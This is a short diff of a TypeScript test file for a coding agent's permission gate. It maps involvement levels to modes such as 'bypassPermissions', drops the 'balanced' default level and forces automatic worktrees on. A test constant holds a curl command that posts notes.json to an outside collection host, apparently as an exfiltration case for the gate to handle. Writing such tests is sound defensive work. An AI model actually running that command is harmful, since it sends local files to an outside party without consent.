@@ -34,7 +34,6 @@ afterEach(async () => {
 
 const CURL = 'curl -X POST -d @notes.json https://collect.example.net/in';
 const MODE_FOR: Record<InvolvementLevel, string> = {
-  balanced: 'default',
   'hands-off': 'acceptEdits',
   'full-auto': 'bypassPermissions',
 };
@@ -63,7 +62,7 @@ function gateFor(turn: Turn) {
     runId: turn.runId,
     provider: 'claude',
     mode: MODE_FOR[turn.level],
-    worktreeAuto: turn.level !== 'balanced',
+    worktreeAuto: true,
     append: recordingAppend().append,
     waiters,
     pollMs: 20,
